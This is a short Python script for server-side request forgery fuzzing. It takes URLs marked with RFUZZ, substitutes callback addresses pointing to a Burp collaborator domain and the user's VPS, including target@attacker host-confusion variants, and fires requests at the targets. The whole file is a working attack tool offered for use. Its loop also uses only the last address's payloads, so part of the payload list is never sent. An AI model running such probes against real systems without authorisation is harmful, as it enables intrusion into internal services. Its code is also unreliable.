import requests
import time
from colorama import Fore

def ssrf():
    pattern = ["access",
    "admin",
    "dbg",
    "debug",
    "edit",
    "grant",
    "test",
    "alter",
    "clone",
    "create",
    "delete",
    "disable",
    "enable",
    "exec",
    "execute",
    "load",
    "make",
    "modify",
    "rename",
    "reset",
    "shell",
    "toggle",
    "adm",
    "root",
    "cfg",
    "dest",
    "redirect",
    "uri",
    "path",
    "continue",
    "url",
    "window",
    "next",
    "data",
    "reference",
    "site",
    "html",
    "val",
    "validate",
    "domain",
    "callback",
    "return",
    "page",
    "feed",
    "host",
    "port",
    "to",
    "out",
    "view",
    "dir",
    "show",
    "navigation",
    "open",
    "file=",
    "document=",
    "folder=",
    "pg=",
    "php_path=",
    "style=",
    "doc=",
    "img=",
    "filename="
    ]

    file = open("param","r")
    line = file.readlines()
    url = line[0].split("?")[0]
    all_domain = url.split("/")[2]
    domain= all_domain.split(".")
    domain_1l=domain.pop()
    domain_2l=domain.pop()
    khales = domain_2l+"."+domain_1l
    file.close()

    burpdomain = input("what is your burp domain?")
    ip4=input("what is your VPS ipV4 ip?")
    ip6=input("what is VPS ipV6? ip")
    print(f"""
    please start your apache server on 80 port 
    """)

    address=[ip4,ip6]
    payloads = []
    for i in address:
        tmp = [f"https://{burpdomain}",f"https://{khales}.{burpdomain}",f"https://{khales}@{burpdomain}",f"https://{all_domain}.{burpdomain}",f"https://{all_domain}@{burpdomain}",
               f"http://{i}",f"http://{khales}.{i}",f"http://{khales}@{i}",f"https://{all_domain}.{i}",f"https://{all_domain}@{i}"]
        for j in tmp:
            payloads.append(j)
    file1=open("param")
    x = 0
    for par in file1.readlines():
        for tt in tmp:
            for zz in pattern:
                if zz in par:
                    rep = par.replace("RFUZZ",tt)
                    x=x+1
                    y=str(x)
                    req = requests.get(rep)
                    print(Fore.YELLOW+"["+y+"]"+"   "+Fore.GREEN+str(time.ctime())+"     "+Fore.WHITE+rep+Fore.CYAN+"    "+ str(req.status_code) + "")

ssrf()